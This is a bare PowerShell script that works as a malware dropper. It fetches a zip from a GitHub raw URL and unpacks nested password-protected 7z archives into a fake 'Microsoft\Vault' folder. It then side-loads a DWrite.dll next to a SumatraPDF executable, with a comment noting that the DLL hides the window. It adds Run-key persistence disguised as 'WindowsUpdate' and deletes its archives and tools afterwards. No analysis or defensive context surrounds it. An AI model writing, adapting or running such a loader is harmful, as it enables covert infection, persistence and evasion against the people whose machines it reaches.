$p = 'Sc8#mK92_vXp'
$v = "$env:LOCALAPPDATA\Microsoft\Vault\"

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

if (!(Test-Path $v)) { New-Item -ItemType Directory -Path $v -Force | Out-Null }

$z = "$v\update_cache.zip"
$wc.DownloadFile('https://github.com/carry780/clieset/raw/refs/heads/main/update_cache.zip', $z)

Expand-Archive -Path $z -DestinationPath $v -Force
Set-Location $v

function Wait-File {
    param($Path, $TimeoutSec = 10)
    $end = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $end) {
        if (Test-Path $Path) {
            $size1 = (Get-Item $Path).Length
            Start-Sleep -Milliseconds 200
            $size2 = (Get-Item $Path).Length
            if ($size1 -eq $size2) { return $true }
        }
        Start-Sleep -Milliseconds 200
    }
    return $false
}

# outer.7z
if (Test-Path '.\7za.exe') {
    $outer = 'outer.7z'
    if (Test-Path $outer) {
        & '.\7za.exe' x $outer "-p$p" -y -o"$v" | Out-Null
        Wait-File "$v\inner.7z" -TimeoutSec 15 | Out-Null
    }
}

# kill
Stop-Process -Name SumatraPDF -Force -ErrorAction SilentlyContinue

# Удаляем старые файлы
Remove-Item "$v\SumatraPDF-3.5.2-64.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$v\DWrite.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$v\DWrite_orig.dll" -Force -ErrorAction SilentlyContinue

# inner.7z
$innerPath = "$v\inner.7z"
if ((Test-Path $innerPath) -and (Test-Path '.\7za.exe')) {
    & '.\7za.exe' x $innerPath "-p$p" -aoa -y -o"$v" | Out-Null
    Wait-File "$v\SumatraPDF-3.5.2-64.exe" -TimeoutSec 15 | Out-Null
    Wait-File "$v\DWrite.dll" -TimeoutSec 5 | Out-Null
    Wait-File "$v\DWrite_orig.dll" -TimeoutSec 5 | Out-Null
}

# Запуск SumatraPDF (окно спрячет DLL)
if (Test-Path "$v\SumatraPDF-3.5.2-64.exe") {
    Start-Process -FilePath "$v\SumatraPDF-3.5.2-64.exe" -WorkingDirectory $v
}

#persist
$exe = "$v\SumatraPDF-3.5.2-64.exe"
if (Test-Path $exe) {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $exe -Force
}

# DElete
Start-Sleep -Seconds 30
Remove-Item $z, "$v\outer.7z", "$v\inner.7z" -Force -ErrorAction SilentlyContinue
Get-ChildItem $v -Include 7za.exe,7za.dll,7zxa.dll | Remove-Item -Force -ErrorAction SilentlyContinue